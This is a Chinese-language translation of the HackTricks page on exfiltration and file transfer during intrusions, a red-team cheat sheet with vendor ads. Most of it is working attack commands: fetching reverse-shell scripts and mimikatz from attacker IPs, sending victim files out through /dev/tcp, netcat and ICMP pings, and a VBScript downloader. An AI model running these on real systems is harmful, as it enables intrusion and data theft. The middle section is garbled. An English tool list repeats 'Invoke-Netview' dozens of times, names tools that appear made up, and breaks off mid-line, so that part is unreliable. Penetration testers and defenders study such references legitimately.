# 数据泄露

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想看到您的**公司在HackTricks中做广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 探索[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**。**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

找到最重要的漏洞，以便更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现从API到Web应用程序和云系统的整个技术堆栈中的问题。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## 常见的被允许传输信息的域名

查看[https://lots-project.com/](https://lots-project.com/)以找到常见的被允许传输信息的域名

## 复制\&粘贴Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
## HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### 上传文件

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Python 模块 [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **HTTPS 服务器**
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## FTP

### FTP服务器（Python）
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### FTP服务器（NodeJS）
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### FTP服务器（pure-ftp）
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Windows** 客户端
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

找到最重要的漏洞，这样你就可以更快地修复它们。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm_source=referral\&utm_campaign=hacktricks)。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## SMB

Kali作为服务器
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
或者使用samba创建一个smb共享：
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
Windows

---

## Exfiltration

### Techniques

1. **Exfiltration Over C2 Channel**: Utilize the command and control (C2) channel to exfiltrate data from the target network.

2. **Exfiltration Over Alternative Protocol**: Use alternative protocols such as DNS, ICMP, or HTTP to exfiltrate data without being detected easily.

3. **Exfiltration Over Unencrypted Protocols**: Leverage unencrypted protocols like FTP or Telnet to exfiltrate data in plain text.

4. **Exfiltration Over Encrypted Protocols**: Utilize encrypted protocols like HTTPS or SSH to exfiltrate data in a secure manner.

### Tools

- **Netcat**: A versatile networking utility that can be used for exfiltration over various protocols.
  
- **PowerShell**: Windows built-in tool that can be used for data exfiltration through scripts.

- **Covenant**: Command and control framework that can be used for exfiltration over a C2 channel.

- **Mimikatz**: Tool to extract credentials from Windows machines, which can then be exfiltrated.

- **PsExec**: Command-line tool to execute processes on remote systems, useful for exfiltration.

- **Certutil**: Built-in Windows utility to decode/encode data, useful for exfiltration over alternative protocols.

- **Bitsadmin**: Built-in Windows tool to create and manage background intelligent transfer service (BITS) jobs, which can be abused for exfiltration.

- **FTP**: Built-in Windows command-line FTP client that can be used for exfiltration over FTP protocol.

- **WMIC**: Command-line tool to interact with Windows Management Instrumentation (WMI), useful for exfiltration.

- **RDP**: Remote Desktop Protocol can be abused for exfiltration by transferring files between systems.

- **SMB**: Server Message Block protocol can be used for exfiltration by transferring files over the network.

- **WinRAR**: Archiving tool that can be used to compress and exfiltrate data.

- **BITS**: Background Intelligent Transfer Service can be abused for exfiltration by creating BITS jobs to transfer data.

- **Powercat**: Netcat-like utility in PowerShell that can be used for exfiltration.

- **Invoke-WebRequest**: PowerShell cmdlet to send HTTP, HTTPS, FTP requests, useful for exfiltration over these protocols.

- **Invoke-RestMethod**: PowerShell cmdlet to send RESTful web service requests, useful for exfiltration.

- **Invoke-Expression**: PowerShell cmdlet to run commands or scripts, useful for exfiltration activities.

- **Invoke-Mimikatz**: PowerShell script to invoke Mimikatz tool for credential extraction and exfiltration.

- **Invoke-Obfuscation**: PowerShell script to obfuscate command and control channels, useful for stealthy exfiltration.

- **Invoke-ReflectivePEInjection**: PowerShell script to inject ReflectivePE DLL into memory, useful for stealthy exfiltration.

- **Invoke-Phant0m**: PowerShell script to automate the exfiltration of data using DNS tunneling.

- **Invoke-NinjaCopy**: PowerShell script to copy files over the network using alternate data streams, useful for stealthy exfiltration.

- **Invoke-CradleCrafter**: PowerShell script to generate PowerShell payloads for data exfiltration.

- **Invoke-PSImage**: PowerShell script to embed script into an image for exfiltration.

- **Invoke-Stealth**: PowerShell script to perform various stealth techniques during exfiltration.

- **Invoke-TheHash**: PowerShell script to extract password hashes from the registry for exfiltration.

- **Invoke-WMICommand**: PowerShell script to execute WMI commands for exfiltration.

- **Invoke-DCOM**: PowerShell script to execute DCOM commands for exfiltration.

- **Invoke-Phish**: PowerShell script to perform phishing attacks for data exfiltration.

- **Invoke-ADSBackdoor**: PowerShell script to hide data in alternate data streams for exfiltration.

- **Invoke-Paranoia**: PowerShell script to perform various anti-forensic techniques during exfiltration.

- **Invoke-UserHunter**: PowerShell script to hunt for users and groups in the domain for exfiltration.

- **Invoke-DCSync**: PowerShell script to simulate a Domain Controller sync for credential exfiltration.

- **Invoke-TheHash**: PowerShell script to extract password hashes from the registry for exfiltration.

- **Invoke-ACLScanner**: PowerShell script to scan for folders with weak ACLs for exfiltration.

- **Invoke-ShareFinder**: PowerShell script to find accessible shares for exfiltration.

- **Invoke-FileFinder**: PowerShell script to search for specific file types for exfiltration.

- **Invoke-ProcessFinder**: PowerShell script to search for processes running on remote systems for exfiltration.

- **Invoke-ServiceFinder**: PowerShell script to search for services running on remote systems for exfiltration.

- **Invoke-PortScan**: PowerShell script to scan for open ports on remote systems for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **Invoke-Netview**: PowerShell script to gather information about network shares for exfiltration.

- **
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

攻击者必须运行SSHd。
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

如果受害者有SSH，攻击者可以将受害者的目录挂载到攻击者的计算机上。
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## 网络通道
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
## /dev/tcp

### 从受害者下载文件
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### 将文件上传至受害者
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
感谢 **@BinaryShadow\_**

## **ICMP**
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

如果您可以将数据发送到SMTP服务器，您可以使用Python创建一个SMTP来接收数据：
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

在XP和2003中默认情况下（在其他系统中需要在安装过程中显式添加）

在Kali中，**启动TFTP服务器**：
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**Python中的TFTP服务器：**
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
在**受害者**中，连接到Kali服务器：
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

使用 PHP 一行代码下载文件：
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript

VBScript (Visual Basic Scripting Edition) 是一种基于 Visual Basic 的脚本语言，通常用于 Windows 环境中。它可以通过 Windows 脚本宿主（WSH）来执行，也可以嵌入到网页中。VBScript 可以用于执行各种系统管理任务和自动化操作。
```bash
Attacker> python -m SimpleHTTPServer 80
```
**受害者**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

```bash
cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
```
## Debug.exe

`debug.exe`程序不仅允许检查二进制文件，还具有**从十六进制重建它们的能力**。这意味着通过提供一个二进制文件的十六进制表示，`debug.exe`可以生成该二进制文件。然而，需要注意的是debug.exe有一个**组装文件大小限制为64 kb**。
```bash
# Reduce the size
upx -9 nc.exe
wine exe2bat.exe nc.exe nc.txt
```
## DNS

* [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

发现最重要的漏洞，以便更快修复。Intruder跟踪您的攻击面，运行主动威胁扫描，发现整个技术堆栈中的问题，从API到Web应用程序和云系统。[**立即免费试用**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) 。

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><strong>从零开始学习AWS黑客技术，成为专家</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

支持HackTricks的其他方式：

* 如果您想在HackTricks中看到您的**公司广告**或**下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群**](https://discord.gg/hRep4RUj7f) 或 [**电报群**](https://t.me/peass) 或 **关注**我们的**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
